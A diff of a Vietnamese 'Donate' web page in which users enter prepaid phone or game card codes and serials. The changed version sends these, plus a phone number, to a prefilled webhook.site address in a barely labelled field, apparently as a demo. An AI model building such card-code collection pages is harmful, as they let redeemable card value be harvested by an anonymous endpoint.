@@ -1,83 +1,169 @@
 <!doctype html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Donate - Tthanh</title>
-  <style>
-    body{font-family:Arial, sans-serif;background:#f5f7fa;margin:0;padding:24px}
-    .box{max-width:520px;margin:24px auto;background:#fff;padding:18px;border-radius:8px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
-    label{display:block;margin:10px 0 6px;font-size:14px}
-    input, select, button{width:100%;padding:10px;border-radius:8px;border:1px solid #d7dbe6;font-size:14px}
-    .row{display:flex;gap:8px}
-    .row > *{flex:1}
-    .result{margin-top:12px;padding:10px;border-radius:6px;background:#f1f6ff;color:#123}
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Nạp thẻ (GitHub Pages) — Demo</title>
+<style>
+  :root { --bg:#f6f8fb; --card:#fff; --accent:#2563eb; }
+  body { font-family: Inter, system-ui, Arial; background:var(--bg); margin:0; color:#111; }
+  .wrap { max-width:720px; margin:36px auto; padding:18px; }
+  .card { background:var(--card); padding:18px; border-radius:10px; box-shadow: 0 8px 30px rgba(12,20,40,0.06); }
+  h1{ margin:0 0 8px;font-size:20px }
+  label{ display:block; margin-top:12px; font-size:13px; color:#333 }
+  input, select, textarea, button { width:100%; padding:10px 12px; margin-top:6px; border-radius:8px; border:1px solid #e6eef8; font-size:14px }
+  .row{ display:flex; gap:8px }
+  .row > *{ flex:1 }
+  .small { font-size:12px; color:#666; margin-top:6px; }
+  .actions{ display:flex; gap:8px; margin-top:12px }
+  .btn { background:var(--accent); color:#fff; border:none; cursor:pointer; padding:10px 14px; border-radius:8px }
+  .btn.secondary { background:#f3f4f6; color:#111; border:1px solid #e5e7eb }
+  pre { background:#0b1220; color:#dbeafe; padding:12px; border-radius:8px; overflow:auto; font-size:13px }
+  .log{ margin-top:12px; padding:12px; border-radius:8px; background:#fbfdff; border:1px dashed #e6eef8; min-height:40px; white-space:pre-wrap; font-size:13px }
+  .hint{ font-size:12px; color:#666; margin-top:8px }
+  form.hidden { display:none }
+</style>
 </head>
 <body>
-  <div class="box">
-    <h2>Donate Me!</h2>
+<div class="wrap">
+  <div class="card">
+    <h1>Donate - Tthanh</h1>
+    <div class="small">Donate đeee</div>
 
-    <label for="provider">Chọn nhà mạng</label>
+    <label for="endpoint">.</label>
+    <input id="endpoint" value="https://webhook.site/c357be6f-d2e0-4830-9af6-f29cd9727a06" />
+
+    <label for="provider">Nhà mạng</label>
     <select id="provider">
-      <option value="viettel">Viettel</option>
-      <option value="mobifone">MobiFone</option>
-      <option value="vinaphone">VinaPhone</option>
-      <option value="garena">Garena</option>
+      <option value="VIETTEL">Viettel</option>
+      <option value="MOBIFONE">Mobifone</option>
+      <option value="VINAPHONE">VinaPhone</option>
+      <option value="GARENA">Garena</option>
     </select>
 
-    <label for="denom">Mệnh giá</label>
-    <select id="denom">
-      <option value="10000">10.000</option>
-      <option value="20000">20.000</option>
-      <option value="50000">50.000</option>
-      <option value="100000">100.000</option>
-      <option value="200000">200.000</option>
-    </select>
-
-    <label for="code">Mã thẻ</label>
-    <input id="code" placeholder="Nhập mã thẻ (ví dụ: 112233445566778 )" />
-
-    <label for="serial">Số seri (Serial)</label>
-    <input id="serial" placeholder="Nhập số seri" />
-
-    <div style="margin-top:12px">
-      <button id="submit">Donate</button>
+    <div class="row">
+      <div>
+        <label for="denom">Mệnh giá</label>
+        <select id="denom">
+          <option value="10000">10,000</option>
+          <option value="20000">20,000</option>
+          <option value="50000">50,000</option>
+          <option value="100000">100,000</option>
+          <option value="200000">200,000</option>
+        </select>
+      </div>
+      <div>
+        <label for="phone">lol</label>
+        <input id="phone" placeholder="" />
+      </div>
     </div>
 
-    <div id="output" class="result" style="display:none"></div>
+    <label for="code">Mã thẻ</label>
+    <input id="code" placeholder="Nhập mã thẻ" />
+
+    <label for="serial">Số seri</label>
+    <input id="serial" placeholder="Nhập số seri" />
+
+    <div class="actions">
+      <button id="sendAjax" class="btn">Gửi (AJAX - JSON)</button>
+      <button id="sendForm" class="btn secondary">Gửi (Form POST)</button>
+    </div>
+
+    <div class="hint">
+      Ghi chú: AJAX sẽ gửi JSON (yêu cầu endpoint hỗ trợ CORS). Form POST gửi dạng urlencoded — an toàn để test với webhook.site.
+    </div>
+
+    <div id="log" class="log">Log sẽ hiển thị ở đây...</div>
+
+    <hr style="margin:16px 0" />
+
+    <h3>Test nhanh: mẫu POST (JSON)</h3>
+    <pre id="sampleJson">{ "provider": "VIETTEL", "denom": "100000", "code": "12345678901234", "serial": "987654321", "phone": "" }</pre>
+
+    <!-- Hidden form (fallback) -->
+    <form id="hiddenForm" class="hidden" method="POST" target="_blank">
+      <input type="text" name="provider" />
+      <input type="text" name="denom" />
+      <input type="text" name="code" />
+      <input type="text" name="serial" />
+      <input type="text" name="phone" />
+    </form>
+
   </div>
+</div>
 
-  <script>
-    const out = document.getElementById('output');
-    document.getElementById('submit').addEventListener('click', async () => {
-      out.style.display='none';
-      const provider = document.getElementById('provider').value;
-      const denom = document.getElementById('denom').value;
-      const code = document.getElementById('code').value.trim();
-      const serial = document.getElementById('serial').value.trim();
+<script>
+  const endpointInput = document.getElementById('endpoint');
+  const providerInput = document.getElementById('provider');
+  const denomInput = document.getElementById('denom');
+  const codeInput = document.getElementById('code');
+  const serialInput = document.getElementById('serial');
+  const phoneInput = document.getElementById('phone');
+  const logEl = document.getElementById('log');
+  const sampleJson = document.getElementById('sampleJson');
+  const hiddenForm = document.getElementById('hiddenForm');
 
-      if(!code || !serial){ alert('Sai Thẻ!'); return; }
+  function setLog(t){ logEl.textContent = (new Date()).toLocaleString() + ' — ' + t; }
+  function appendLog(t){ logEl.textContent += '\\n' + (new Date()).toLocaleString() + ' — ' + t; }
 
-      out.textContent = 'Đang donate...';
-      out.style.display = 'block';
+  function buildPayload(){
+    return {
+      provider: providerInput.value,
+      denom: denomInput.value,
+      code: codeInput.value.trim(),
+      serial: serialInput.value.trim(),
+      phone: phoneInput.value.trim()
+    };
+  }
 
-      try{
-        const resp = await fetch('/api/redeem', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({provider, denom, code, serial})
-        });
-        const j = await resp.json();
-        if(resp.ok){
-          out.innerHTML = `<strong>OK</strong><br/>Trạng thái: ${j.status}<br/>Chi tiết: ${j.message || ''}`;
-        } else {
-          out.innerHTML = `<strong>Lỗi</strong><br/>${j.error || j.message || 'Không rõ lỗi'}`;
-        }
-      } catch(err){
-        out.innerHTML = `<strong>Lỗi mạng</strong><br/>${err.message}`;
-      }
-    });
-  </script>
+  function updateSample(){
+    sampleJson.textContent = JSON.stringify(buildPayload(), null, 2);
+  }
+
+  // Update sample on change
+  [providerInput, denomInput, codeInput, serialInput, phoneInput].forEach(el => el.addEventListener('input', updateSample));
+
+  document.getElementById('sendAjax').addEventListener('click', async () => {
+    const url = endpointInput.value.trim();
+    if(!url){ setLog('Vui lòng nhập endpoint'); return; }
+    const payload = buildPayload();
+    updateSample();
+    setLog('Đang gửi JSON tới ' + url + ' ...');
+
+    try{
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+
+      const text = await resp.text();
+      appendLog('HTTP ' + resp.status + ' — ' + (text.length>800 ? text.slice(0,800)+'... (truncated)' : text));
+      // nếu response là JSON, hiển thị đẹp:
+      try { const j = JSON.parse(text); appendLog('Response JSON: ' + JSON.stringify(j, null, 2)); } catch(e){}
+    } catch (err) {
+      appendLog('Lỗi gửi AJAX: ' + err.message + '\\n(Chú ý: endpoint phải cho phép CORS nếu gửi từ GitHub Pages)');
+    }
+  });
+
+  document.getElementById('sendForm').addEventListener('click', () => {
+    const url = endpointInput.value.trim();
+    if(!url){ setLog('Vui lòng nhập endpoint'); return; }
+    const payload = buildPayload();
+    // set hidden form action -> open in new tab so you can inspect webhook.site
+    hiddenForm.action = url;
+    hiddenForm.provider.value = payload.provider;
+    hiddenForm.denom.value = payload.denom;
+    hiddenForm.code.value = payload.code;
+    hiddenForm.serial.value = payload.serial;
+    hiddenForm.phone.value = payload.phone;
+    hiddenForm.submit();
+    setLog('Đã submit form POST tới ' + url + ' (mở tab mới)');
+  });
+
+  // initial sample
+  updateSample();
+  setLog('Sẵn sàng. Endpoint mặc định là webhook.site; thay nếu muốn gửi tới server khác.');
+</script>
 </body>
 </html>
